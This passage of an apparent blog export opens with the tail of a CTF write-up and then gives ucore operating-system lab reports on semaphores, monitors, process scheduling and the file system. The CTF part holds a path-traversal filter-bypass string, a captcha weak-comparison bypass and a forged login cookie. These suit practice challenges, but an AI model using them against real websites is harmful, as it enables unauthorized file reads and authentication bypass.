在query.php即可找到key 0x03 读文件点击1.txt 猜测代码是include或者是file_get_content 但不知道1.txt的目录在哪 尝试访问1.txt 估计在/a中的一个子目录下假设为/a/xxx/那么flag.php的位置应该是include的上级目录则是../flag.php因为./被替换成了空则上述字符串改写为…//fla./g.php 0x04 验证码这又是一道关于验证码的题目。目前来说一些高级的验证码还是很安全的。这一题只是简单的验证码的实现，如果想知道原理可以参照我的另一篇博客首先看这一题 验证码在验证的时候一般会有session会话 在验证的时候如果session检测这么写 $_POST[‘authcode’] == $_SESSION[‘authcode’] 注意这里运用了弱类型比较 那么就有绕过的机会 当两者都为空的时候就可以绕过 此题我猜想就是这样 利用burp直接爆破 0x05 spring-css直接网上查找cve 直接使用 发现flag位置 0x06 注入越权这一题也是看过writeup写的，感觉一开始没有get到点，其实正过来向原理倒是挺简单的看网页源码有提示，其实就是admin登录，利用update特性 首先它过滤了一些关键字符不能使用引号 看具体的注入代码0x07 Forbidden最开始想到的是XXF 不过到最后层层递加 解决什么问题自己百度吧 最后有个脑洞，话又说回来都是套路4e6a59324d545a6a4e7a4d324e513d3d //16进制NjY2MTZjNzM2NQ==//base6466616c7365//16进制转字符false利用上述过程写出逆算法得到4e7a51334d6a63314e6a553d 放入cookie login=4e7a51334d6a63314e6a553d 最后传过去比对即可]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab7]]></title>
    <url>%2F2017%2F06%2F12%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab7%2F</url>
    <content type="text"><![CDATA[练习0填写已有实验练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题0x0 哲学家问题0x1 信号量介绍0x2 P操作V操作实现0x3 代码分析0x4 信号量性质练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题0x1 管程机制0x2 数据结构0x3 组成函数实验截图练习0:填写已有实验使用meld的软件进行对比即可 这里把需要填充的文件罗列如下 练习0填写已有实验练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题0x0 哲学家问题0x1 信号量介绍0x2 P操作V操作实现0x3 代码分析0x4 信号量性质练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题0x1 管程机制0x2 数据结构0x3 组成函数实验截图实验感悟练习0:填写已有实验使用meld的软件进行对比即可 这里把需要填充的文件罗列如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.csche.c练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题0x0 哲学家问题哲学家就餐问题，即有五个哲学家,他们的生活方式是交替地进行思考和进餐。哲学家们公用一张圆桌,周围放有五把椅子,每人坐一把。在圆桌上有五个碗和五根筷子,当一个哲学家思考时,他不与其他人交谈,饥饿时便试图取用其左、右最靠近他的筷子,但他可能一根都拿不到。只有在他拿到两根筷子时,方能进餐,进餐完后,放下筷子又继续思考。0x1 信号量介绍struct semaphore {int count;queueType queue;};void P(semaphore S){ S.count–； if (S.count&lt;0) { 把进程置为睡眠态； 将进程的PCB插入到S.queue的队尾； 调度，让出CPU； }}void V(semaphore S){ S.count++； if (S.count≤0) { 唤醒在S.queue上等待的第一个进程； }}基于上诉信号量实现可以认为，当多个（&gt;1）进程可以进行互斥或同步合作时，一个进程会由于无法满足信号量设置的某条件而在某一位置停止，直到它接收到一个特定的信号（表明条件满足了）。为了发信号，需要使用一个称作信号量的特殊变量。为通过信号量s传送信号，信号量的V操作采用进程可执行原语semSignal(s)；为通过信号量s接收信号，信号量的P操作采用进程可执行原语semWait(s)；如果相应的信号仍然没有发送，则进程被阻塞或睡眠，直到发送完为止。0x2 P操作&amp;V操作实现P操作具体实现信号量的P操作，首先关掉中断，然后判断当前信号量的value是否大于0。如果是&gt;0，则表明可以获得信号量，故让value减一，并打开中断返回即可；如果不是&gt;0，则表明无法获得信号量，故需要将当前的进程加入到等待队列中，并打开中断，然后运行调度器选择另外一个进程执行。如果被V操作唤醒，则把自身关联的wait从等待队列中删除（此过程需要先关中断，完成后开中断）。具体实现如下所示：static noinline uint32_t down(semaphore_t sem, uint32_t wait_state) { bool intr_flag; local_intr_save(intr_flag); //关掉中断 if (sem-&gt;value &gt; 0) {//当前信号量value大于0 sem-&gt;value –;//直接让value减一 local_intr_restore(intr_flag);//开中断返回 return 0; } //当前信号量value小于等于0，表明无法获得信号量 wait_t __wait, wait = &amp;wait; wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state);//将当前的进程加入到等待队列中 local_intr_restore(intr_flag);//打开中断 schedule();//运行调度器选择其他进程执行 local_intr_save(intr_flag);//关中断 wait_current_del(&amp;(sem-&gt;wait_queue), wait);//被V操作唤醒，从等待队列移除 local_intr_restore(intr_flag);//开中断 if (wait-&gt;wakeup_flags != wait_state) { return wait-&gt;wakeup_flags; } return 0;}V操作具体实现信号量的V操作，首先关中断，如果信号量对应的wait queue中没有进程在等待，直接把信号量的value加一，然后开中断返回；如果有进程在等待且进程等待的原因是semophore设置的，则调用wakeup_wait函数将waitqueue中等待的第一个wait删除，且把此wait关联的进程唤醒，最后开中断返回。具体实现如下所示：static noinline void __up(semaphore_t sem, uint32_t wait_state) { bool intr_flag; local_intr_save(intr_flag);//关闭中断 { wait_t wait; if ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == NULL) {//没有进程等待 sem-&gt;value ++;//信号量的value加一 } else {//有进程在等待 assert(wait-&gt;proc-&gt;wait_state == wait_state); wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, 1);//将wait_queue中等待的第一个wait删除，并将该进程唤醒 } } local_intr_restore(intr_flag);//开启中断返回}0x3 代码分析check_sec 第一部分是实现基于信号量的哲学家问题,第二部分是实现基于管程的哲学家问题void check_sync(void){ int i; //check semaphore sem_init(&amp;mutex, 1); for(i=0;i&lt;N;i++){d sem_init(&amp;s[i], 0); int pid = kernel_thread(philosopher_using_semaphore, (void )i, 0); if (pid &lt;= 0) { panic(“create No.%d philosopher_using_semaphore failed.\n”); } philosopher_proc_sema[i] = find_proc(pid); set_proc_name(philosopher_proc_sema[i], “philosopher_sema_proc”); } //check condition variable monitor_init(&amp;mt, N); for(i=0;i&lt;N;i++){ state_condvar[i]=THINKING; int pid = kernel_thread(philosopher_using_condvar, (void )i, 0); if (pid &lt;= 0) { panic(“create No.%d philosopher_using_condvar failed.\n”); } philosopher_proc_condvar[i] = find_proc(pid); set_proc_name(philosopher_proc_condvar[i], “philosopher_condvar_proc”); }}第一部分就是本实验内容首先实现初始化了一个互斥信号量，然后创建了对应5个哲学家行为的5个信号量，并创建5个内核线程代表5个哲学家，每个内核线程完成了基于信号量的哲学家吃饭睡觉思考行为实现。现在我们继续跟进philosopher_using_semaphore函数观察它的具体实现。int philosopher_using_semaphore(void arg) / i：哲学家号码，从0到N-1 /{ int i, iter=0; i=(int)arg; cprintf(“I am No.%d philosopher_sema\n”,i); while(iter++&lt;TIMES)/ 无限循环 / { cprintf(“Iter %d, No.%d philosopher_sema is thinking\n”,iter,i); // 哲学家正在思考 do_sleep(SLEEP_TIME); phi_take_forks_sema(i); // 需要两只叉子，或者阻塞 cprintf(“Iter %d, No.%d philosopher_sema is eating\n”,iter,i); // 进餐 do_sleep(SLEEP_TIME); phi_put_forks_sema(i); // 把两把叉子同时放回桌子 } cprintf(“No.%d philosopher_sema quit\n”,i); return 0;}phi_take_forks_sema和phi_put_forks_semavoid phi_take_forks_sema(int i) / i：哲学家号码从0到N-1 /{ down(&amp;mutex); / 进入临界区 / state_sema[i]=HUNGRY; / 记录下哲学家i饥饿的事实 / phi_test_sema(i); / 试图得到两只叉子 / up(&amp;mutex); / 离开临界区 / down(&amp;s[i]); / 如果得不到叉子就阻塞 /}void phi_put_forks_sema(int i) / i：哲学家号码从0到N-1 /{ down(&amp;mutex); / 进入临界区 / state_sema[i]=THINKING; / 哲学家进餐结束 / phi_test_sema(LEFT); / 看一下左邻居现在是否能进餐 / phi_test_sema(RIGHT); / 看一下右邻居现在是否能进餐 / up(&amp;mutex); / 离开临界区 /}0x4 信号量性质我们可以看出信号量的计数器value具有有如下性质： value&gt;0，表示共享资源的空闲数 vlaue&lt;0，表示该信号量的等待队列里的进程数 value=0，表示等待队列为空练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题0x1 管程机制即要求首先掌握管程机制,然后基于信号量实现完成条件变量实现,然后用管程机制实现哲学家就餐问题的解决方案。管程，即定义了一个数据结构和能为并发进程所执行(在该数据结构上)的一组操作,这组操作能同步进程和改变管程中的数据。 管程相当于一个隔离区，它把共享变量和对它进行操作的若干个过程围了起来，所有进程要访问临界资源时，都必须经过管程才能进入，而管程每次只允许一个进程进入管程,从而需要确保进程之间互斥。 管程主要由这四个部分组成1、管程内部的共享变量;2、管程内部的条件变量;3、管程内部并发执行的进程;4、对局部于管程内部的共享数据设置初始值的语句。所谓条件变量，即将等待队列和睡眠条件包装在一起，就形成了一种新的同步机制，称为条件变量。个条件变量CV可理解为一个进程的等待队列,队列中的进程正等待某个条件C变为真。每个条件变量关联着一个断言Pc。当一个进程等待一个条件变量,该进程不算作占用了该管程,因而其它进程可以进入该管程执行,改变管程的状态,通知条件变量CV其关联的断言Pc在当前状态下为真。因而条件变量两种操作如下： - wait_cv: 被一个进程调用,以等待断言Pc被满足后该进程可恢复执行. 进程挂在该条件变量上等待时,不被认为是占用了管程。 - 被一个进程调用,以指出断言Pc现在为真,从而可以唤醒等待断言Pc被满足的进程继续执行。0x2 数据结构大概了解了原理之后，接下来我们开始分析具体的代码。 ucore中的管程机制是基于信号量和条件变量来实现的。管程的数据结构monitor_t如下：typedef struct monitor{ semaphore_t mutex; // 二值信号量，只允许一个进程进入管程，初始化为1 semaphore_t next; //配合cv，用于进程同步操作的信号量 int next_count; // 睡眠的进程数量 condvar_t cv; // 条件变量cv} monitor_t;管程中的条件变量cv通过执行wait_cv，会使得等待某个条件C为真的进程能够离开管程并睡眠，且让其他进程进入管程继续执行；而进入管程的某进程设置条件C为真并执行signal_cv时，能够让等待某个条件C为真的睡眠进程被唤醒，从而继续进入管程中执行。发出signal_cv的进程A会唤醒睡眠进程B，进程B执行会导致进程A睡眠，直到进程B离开管程，进程A才能继续执行，这个同步过程是通过信号量next完成的；而next_count表示了由于发出singal_cv而睡眠的进程个数。条件变量condvar_t的数据结构如下：typedef struct condvar{ semaphore_t sem; //用于发出wait_cv操作的等待某个条件C为真的进程睡眠 int count; // 在这个条件变量上的睡眠进程的个数 monitor_t owner; // 此条件变量的宿主管程} condvar_t;0x3 组成函数cond_signa函数 分析完数据结构之后，我们开始分析管程的实现。 ucore设计实现了条件变量wait_cv操作和signal_cv操作对应的具体函数，即cond_wait函数和cond_signal函数，此外还有cond_init初始化函数。 先看看cond_signal函数，实现如下：voidcond_signal (condvar_t cvp) { cprintf(“cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count); if(cvp-&gt;count&gt;0) { //当前存在睡眠的进程 cvp-&gt;owner-&gt;next_count ++;//睡眠的进程总数加一 up(&amp;(cvp-&gt;sem));//唤醒等待在cv.sem上睡眠的进程 down(&amp;(cvp-&gt;owner-&gt;next));//把自己睡眠 cvp-&gt;owner-&gt;next_count –;//睡醒后等待此条件的睡眠进程个数减一 } cprintf(“cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);}cond_wait函数 首先进程B判断cv.count，如果不大于0，则表示当前没有睡眠的进程，因此就没有被唤醒的对象了，直接函数返回即可； 如果大于0，这表示当前有睡眠的进程A，因此需要唤醒等待在cv.sem上睡眠的进程A。由于只允许一个进程在管程中执行，所以一旦进程B唤醒了别人（进程A），那么自己就需要睡眠。故让monitor.next_count加一，且让自己（进程B）睡在信号量monitor.next上。如果睡醒了，这让monitor.next_count减一。同样，再来看看cond_wait函数，实现如下：voidcond_wait (condvar_t *cvp) { //LAB7 EXERCISE1: YOUR CODE cprintf(“cond_wait begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count); cvp-&gt;count++;//需要睡眠的进程个数加一 if(cvp-&gt;owner-&gt;next_count &gt; 0) up(&amp;(cvp-&gt;owner-&gt;next));//唤醒进程链表中的下一个进程 else up(&amp;(cvp-&gt;owner-&gt;mutex));//否则唤醒睡在monitor.mutex上的进程 down(&amp;(cvp-&gt;sem));//将自己睡眠 cvp-&gt;count –;//睡醒后等待此条件的睡眠进程个数减一 cprintf(“cond_wait end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);}可以看出如果进程A执行了cond_wait函数，表示此进程等待某个条件C不为真，需要睡眠。因此表示等待此条件的睡眠进程个数cv.count要加一。接下来会出现两种情况。 情况一：如果monitor.next_count如果大于0，表示有大于等于1个进程执行cond_signal函数且睡着了，就睡在了monitor.next信号量上。假定这些进程形成S进程链表。因此需要唤醒S进程链表中的一个进程B。然后进程A睡在cv.sem上，如果睡醒了，则让cv.count减一，表示等待此条件的睡眠进程个数少了一个，可继续执行。 情况二：如果monitor.next_count如果小于等于0，表示目前没有进程执行cond_signal函数且睡着了，那需要唤醒的是由于互斥条件限制而无法进入管程的进程，所以要唤醒睡在monitor.mutex上的进程。然后进程A睡在cv.sem上，如果睡醒了，则让cv.count减一，表示等待此条件的睡眠进程个数少了一个，可继续执行了！这样我们就可以在此基础上继续完成哲学家就餐问题的解决了，主要是就是如下的两个函数：void phi_take_forks_condvar(int i) { down(&amp;(mtp-&gt;mutex)); //通过P操作进入临界区 state_condvar[i]=HUNGRY; //记录下哲学家i是否饥饿，即处于等待状态拿叉子 phi_test_condvar(i); while (state_condvar[i] != EATING) { cprintf(“phi_take_forks_condvar: %d didn’t get fork and will wait\n”,i); cond_wait(&amp;mtp-&gt;cv[i]);//如果得不到叉子就睡眠 } //如果存在睡眠的进程则那么将之唤醒 if(mtp-&gt;next_count&gt;0) up(&amp;(mtp-&gt;next)); else up(&amp;(mtp-&gt;mutex));}void phi_put_forks_condvar(int i) { down(&amp;(mtp-&gt;mutex));//通过P操作进入临界区 state_condvar[i]=THINKING;//记录进餐结束的状态 phi_test_condvar(LEFT);//看一下左边哲学家现在是否能进餐 phi_test_condvar(RIGHT);//看一下右边哲学家现在是否能进餐 //如果有哲学家睡眠就予以唤醒 if(mtp-&gt;next_count&gt;0) up(&amp;(mtp-&gt;next)); else up(&amp;(mtp-&gt;mutex));}实验截图 实验成功实验感悟本次实验使我对互斥以及同步有了更深的认识， 实验七提供了多种同步互斥手段，包括中断控制、等待队列、信号量、管程机制（包含条件变量设计）等，并基于信号量实现了哲学家问题的执行过程。而练习是要求用管程机制实现哲学家问题的执行过程。使得学到的知识得到了实践。下一步还是要提高自己的动手能力。]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab6]]></title>
    <url>%2F2017%2F06%2F12%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab6%2F</url>
    <content type="text"><![CDATA[练习0 填写已有实验meld的软件进行对比即可 现在将需要修改的文件罗列如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.c根据注释的提示，主要是一下两个函数需要额外加以修改。alloc_proc函数 完整代码如下：static struct proc_struct *allocproc(void) { struct proc 练习0 填写已有实验练习1 使用Round Robin调度算法0x1 执行过程0x2 算法实现练习2 实现Stride Scheduling调度算法实验结果实验心得练习0 填写已有实验meld的软件进行对比即可 现在将需要修改的文件罗列如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.c根据注释的提示，主要是一下两个函数需要额外加以修改。alloc_proc函数 完整代码如下：static struct proc_struct alloc_proc(void) { struct proc_struct proc = kmalloc(sizeof(struct proc_struct)); if (proc != NULL) { proc-&gt;state = PROC_UNINIT; //设置进程初始状态 proc-&gt;pid = -1; //进程id=-1 proc-&gt;runs = 0; //初始化时间片为0 proc-&gt;kstack = 0; //初始化内存栈的地址为0 proc-&gt;need_resched = 0; //是否需要调度设为不需要 proc-&gt;parent = NULL; //将父节点置空 proc-&gt;mm = NULL; //置空虚拟内存 memset(&amp;(proc-&gt;context), 0, sizeof(struct context));//初始化上下文 proc-&gt;tf = NULL; //将中断帧指针置空 proc-&gt;cr3 = boot_cr3; //将页目录设内核页目录表的基址 proc-&gt;flags = 0; //初始化标志位 memset(proc-&gt;name, 0, PROC_NAME_LEN);//置空进程名 proc-&gt;wait_state = 0; //初始化进程等待状态 proc-&gt;cptr=proc-&gt;yptr=proc-&gt;optr = NULL;//初始化进程相关指针 proc-&gt;rq = NULL;//置空运行队列 list_init(&amp;(proc-&gt;run_link));//初始化运行队列的指针 proc-&gt;time_slice = 0; //初始化时间片 proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = proc-&gt;lab6_run_pool.parent = NULL; //初始化各类指针为空 proc-&gt;lab6_stride = 0; //初始化当前运行步数 proc-&gt;lab6_priority = 0; //初始化优先级 } return proc;}相比于lab5，lab6对proc_struct结构体再次做了扩展，这里主要是多出了以下部分 proc-&gt;rq = NULL; //初始化运行队列为空 list_init(&amp;(proc-&gt;run_link));//初始化运行队列的指针 proc-&gt;time_slice = 0; //初始化时间片 proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right proc-&gt;lab6_run_pool.parent = NULL; //初始化各类指针为空，包括父进程等待 proc-&gt;lab6_stride = 0; //步数初始化 proc-&gt;lab6_priority = 0; //初始化优先级trap_dispatch函数static voidtrap_dispatch(struct trapframe tf) { …… …… ticks ++; assert(current != NULL); run_timer_list(); //更新定时器，并根据参数调用调度算法 break; …… ……}练习1 使用Round Robin调度算法理解并分析sched_calss中各个函数指针的用法，并接合Round Robin 调度算法描ucore的调度执行过程0x1 执行过程让所有runnable态的进程分时轮流使用CPU时间。RR调度器维护当前runnable进程的有序运行队列。当前进程的时间片用完之后，调度器将当前进程放置到运行队列的尾部，再从其头部取出进程进行调度。RR调度算法的就绪队列在组织结构上也是一个双向链表，只是增加了一个成员变量，表明在此就绪进程队列中的最大执行时间片。而且在进程控制块proc_struct中增加了一个成员变量time_slice，用来记录进程当前的可运行时间片段。这是由于RR调度算法需要考虑执行进程的运行时间不能太长。在每个timer到时的时候，操作系统会递减当前执行进程的time_slice，当time_slice为0时，就意味着这个进程运行了一段时间（这个时间片段称为进程的时间片），需要把CPU让给其他进程执行，于是操作系统就需要让此进程重新回到rq的队列尾，且重置此进程的时间片为就绪队列的成员变量最大时间片max_time_slice值，然后再从rq的队列头取出一个新的进程执行。0x2 算法实现RR_init完成了对进程队列的初始化 static void RR_init(struct run_queue rq) { list_init(&amp;(rq-&gt;run_list)); rq-&gt;proc_num = 0; } RR_enqueue的函数实现如下表所示。即把某进程的进程控制块指针放入到rq队列末尾，且如果进程控制块的时间片为0，则需要把它重置为rq成员变量max_time_slice。这表示如果进程在当前的执行时间片已经用完，需要等到下一次有机会运行时，才能再执行一段时间。 static void RR_enqueue(struct run_queue rq, struct proc_struct proc) { assert(list_empty(&amp;(proc-&gt;run_link))); list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link)); if (proc-&gt;time_slice == 0 || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) { proc-&gt;time_slice = rq-&gt;max_time_slice; } proc-&gt;rq = rq; rq-&gt;proc_num ++; } RR_dequeue的函数实现如下表所示。即把就绪进程队列rq的进程控制块指针的队列元素删除，并把表示就绪进程个数的proc_num减一。 static void RR_dequeue(struct run_queue rq, struct proc_struct proc) { assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq); list_del_init(&amp;(proc-&gt;run_link)); rq-&gt;proc_num –; } RR_pick_next的函数实现如下表所示。即选取就绪进程队列rq中的队头队列元素，并把队列元素转换成进程控制块指针。 static struct proc_struct RR_pick_next(struct run_queue rq) { list_entry_t le = list_next(&amp;(rq-&gt;run_list)); if (le != &amp;(rq-&gt;run_list)) { return le2proc(le, run_link); } return NULL; } RR_proc_tick的函数实现如下表所示。即每次timer到时后，trap函数将会间接调用此函数来把当前执行进程的时间片time_slice减一。如果time_slice降到零，则设置此进程成员变量need_resched标识为1，这样在下一次中断来后执行trap函数时，会由于当前进程程成员变量need_resched标识为1而执行schedule函数，从而把当前执行进程放回就绪队列末尾，而从就绪队列头取出在就绪队列上等待时间最久的那个就绪进程执行。static void RR_proc_tick(struct run_queue rq, struct proc_struct proc) { if (proc-&gt;time_slice &gt; 0) { proc-&gt;time_slice –; } if (proc-&gt;time_slice == 0) { proc-&gt;need_resched = 1; }} 练习2 实现Stride Scheduling调度算法首先需要换掉RR调度器的实现，即用default_sched_stride_c覆盖default_sched.c。然后根据此文件和后续文档对Stride度器的相关描述，完成Stride调度算法的实现。首先，根据实验指导书的要求，先用default_sched_stride_c覆盖default_sched.c，即覆盖掉Round Robin调度算法的实现。 覆盖掉之后需要在该框架上实现Stride Scheduling调度算法。 关于Stride Scheduling调度算法，经过查阅资料和实验指导书，我们可以简单的把思想归结如下：1、为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。2、每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。3、在一段固定的时间之后，回到步骤2，重新调度当前stride最小的进程首先是初始化函数stride_init。 开始初始化运行队列，并初始化当前的运行队，然后设置当前运行队列内进程数目为0。static voidstride_init(struct run_queue rq) { / LAB6: YOUR CODE / list_init(&amp;(rq-&gt;run_list)); rq-&gt;lab6_run_pool = NULL; rq-&gt;proc_num = 0;} 然后是入队函数stride_enqueue，根据之前对该调度算法的分析，这里函数主要是初始化刚进入运行队列的进程 proc 的stride属性，然后比较队头元素与当前进程的步数大小，选择步数最小的运行，即将其插入放入运行队列中去，这里并未放置在队列头部。最后初始化时间片，然后将运行队列进程数目加一。static voidstride_enqueue(struct run_queue rq, struct proc_struct proc) { / LAB6: YOUR CODE /#if USE_SKEW_HEAP rq-&gt;lab6_run_pool = //在使用优先队列的实现中表示当前优先队列的头元素 skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);//比较队头元素与当前进程的步数大小，选择步数最小的运行#else assert(list_empty(&amp;(proc-&gt;run_link))); list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));//将 proc插入放入运行队列中去#endif if (proc-&gt;time_slice == 0 || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) {//初始化时间片 proc-&gt;time_slice = rq-&gt;max_time_slice; } proc-&gt;rq = rq; rq-&gt;proc_num ++;} 然后是出队函数stride_dequeue，即完成将一个进程从队列中移除的功能，这里使用了优先队列。最后运行队列数目减一。static voidstride_dequeue(struct run_queue rq, struct proc_struct proc) { / LAB6: YOUR CODE /#if USE_SKEW_HEAP rq-&gt;lab6_run_pool = skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);// 在斜堆中删除相应元素#else assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq); list_del_init(&amp;(proc-&gt;run_link));// 从运行队列中删除相应元素#endif rq-&gt;proc_num –; } 接下来就是进程的调度函数stride_pick_next，观察代码，它的核心是先扫描整个运行队列，返回其中stride值最小的对应进程，然后更新对应进程的stride值，将步长设置为优先级的倒数，如果为0则设置为最大的步长。static struct proc_struct stride_pick_next(struct run_queue rq) { / LAB6: YOUR CODE /#if USE_SKEW_HEAP if (rq-&gt;lab6_run_pool == NULL) return NULL; struct proc_struct p = le2proc(rq-&gt;lab6_run_pool, lab6_run_pool);#else list_entry_t le = list_next(&amp;(rq-&gt;run_list)); if (le == &amp;rq-&gt;run_list) return NULL; struct proc_struct p = le2proc(le, run_link); le = list_next(le); while (le != &amp;rq-&gt;run_list) { struct proc_struct q = le2proc(le, run_link); if ((int32_t)(p-&gt;lab6_stride - q-&gt;lab6_stride) &gt; 0) p = q; le = list_next(le); }#endif //更新对应进程的stride值 if (p-&gt;lab6_priority == 0)//优先级设置 p-&gt;lab6_stride += BIG_STRIDE;//步长为0则设置为最大步长保持相减的有效性 else p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;//步长设置为优先级的倒数 return p;}函数stride_proc_tick的主要工作是检测当前进程的时间片是否已经用完。如果时间片已经用完,就会按照正确的流程进行进程的切换工作。这里和之前实现的Round Robin调度算法一样，所采用的思想也是一致的优先队列比较函数proc_stride_comp_f的实现，主要利用思路是通过相减之后的值，进行判断大小static intproc_stride_comp_f(void a, void b){ struct proc_struct p = le2proc(a, lab6_run_pool); struct proc_struct q = le2proc(b, lab6_run_pool); int32_t c = p-&gt;lab6_stride - q-&gt;lab6_stride;//步数相减，通过正负比较大小关系 if (c &gt; 0) return 1; else if (c == 0) return 0; else return -1;} 实验结果实验心得通过这一次实验我对轮转法以及stride法有了更多的了解，stride法其实就是轮转法的一种升级。stride法加入了对进程优先级的调整，步数越小，进程优先级越大。这种改变更加合理。进程的调度极大的提高了CPU的利用率。更加深刻的理解了进程切换的原理，对Stride Schedule算法的原理和算法可控性和确定性有了更深的认识。]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab8]]></title>
    <url>%2F2017%2F06%2F12%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab8%2F</url>
    <content type="text"><![CDATA[练习0 填写已有实验将已完成的lab7和lab8进行对比 需要修改的文件如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.csche.cmonitor.check_sync.c练习1 完成读文件操作的实现 首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolo 练习0 填写已有实验将已完成的lab7和lab8进行对比 需要修改的文件如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.csche.cmonitor.check_sync.c练习1 完成读文件操作的实现首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolock读文件中数据的实现代码。0x1 ucore文件系统总体介绍根据实验指导书，我们可以了解到，ucore的文件系统架构主要由四部分组成：通用文件系统访问接口层:该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。文件系统抽象层:向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个抽象函数指针列表和数据结构来屏蔽不同文件系统的实现细节。Simple FS文件系统层:一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口外设接口层:向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口,比如disk设备接口/串口设备接口/键盘设备接口等。0x2 ucore文件相关关键数据结构及其关系0x3 重要数据结构首先是file数据结构：struct file {enum {FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,} status; //访问文件的执行状态bool readable; //文件是否可读bool writable; //文件是否可写int fd; //文件在filemap中的索引值off_t pos; //访问文件的当前位置struct inode node;//该文件对应的内存inode指针atomic_t open_count;//打开此文件的次数};接下来inode数据结构，它是位于内存的索引节点，把不同文件系统的特定索引节点信息(甚至不能算是一个索引节点)统一封装起来，避免了进程直接访问具体文件系统struct inode {union { //包含不同文件系统特定inode信息的union域struct device device_info; //设备文件系统内存inode信息struct sfs_inode sfs_inode_info; //SFS文件系统内存inode信息} in_info;enum {inode_type_device_info = 0x1234,inode_type_sfs_inode_info,} in_type; //此inode所属文件系统类型atomic_t ref_count; //此inode的引用计数atomic_t open_count; //打开此inode对应文件的个数struct fs in_fs; //抽象的文件系统,包含访问文件系统的函数指针const struct inode_ops in_ops; //抽象的inode操作,包含访问inode的函数指针};内存中的索引节点struct sfs_inode { struct sfs_disk_inode din; / on-disk inode / uint32_t ino; / inode number / uint32_t flags; / inode flags / bool dirty; / true if inode modified / int reclaim_count; / kill inode if it hits zero / semaphore_t sem; / semaphore for din / list_entry_t inode_link; / entry for linked-list in sfs_fs / list_entry_t hash_link; / entry for hash linked-list in sfs_fs /};SFS中的磁盘索引节点代表了一个实际位于磁盘上的文件。首先我们看看在硬盘上的索引节点的内容：struct sfs_disk_inode { uint32_t size; 如果inode表示常规文件，则size是文件大小 uint16_t type; inode的文件类型 uint16_t nlinks; 此inode的硬链接数 uint32_t blocks; 此inode的数据块数的个数 uint32_t direct[SFS_NDIRECT]; 此inode的直接数据块索引值（有SFS_NDIRECT个） uint32_t indirect; 此inode的一级间接数据块索引值};0x4 打开文件原理首先假定用户进程需要打开的文件已经存在在硬盘上。以user/sfs_filetest1.c为例，首先用户进程会调用在main函数中的如下语句： int fd1 = safe_open(“/test/testfile”, O_RDWR | O_TRUNC);①通用文件访问接口层的处理流程首先进入通用文件访问接口层的处理流程，即进一步调用如下用户态函数： 